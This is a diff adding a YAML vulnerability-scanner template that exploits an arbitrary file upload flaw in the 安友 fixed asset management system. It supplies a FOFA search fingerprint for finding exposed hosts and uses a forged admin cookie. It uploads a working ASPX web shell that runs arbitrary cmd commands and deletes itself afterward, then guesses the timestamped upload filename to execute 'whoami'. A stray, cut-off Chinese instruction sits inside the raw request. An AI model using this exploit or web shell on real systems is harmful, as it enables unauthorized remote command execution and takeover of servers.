@@ -1,0 +1,88 @@
+id: poc-qplug52y0vv25sim
+info:
+  name: 安友固定资产管理系统 ImportForFy存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qplug52y0vv25sim'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qplug52y0vv25sim
+    fofa: body="style/v2/layuiadmin/lib/"
+http:
+- raw:
+  - 'POST /Ams/Asset/ImportForFy HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="NewFile"; filename="qazwe.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>
+
+    ------WebKitFormBoundary--
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1784558843033-edbbba97-a665-463c-b2eb-2fd4999e1d98.png)
+
+    去遍历当前日期格式的文件，比如现在是下午5点21分，则去遍历'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /upload/202512150521{{int(00-59)}}.aspx?cmd=whoami HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+
+    Accept-Language: en-US,en;q=0.5'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
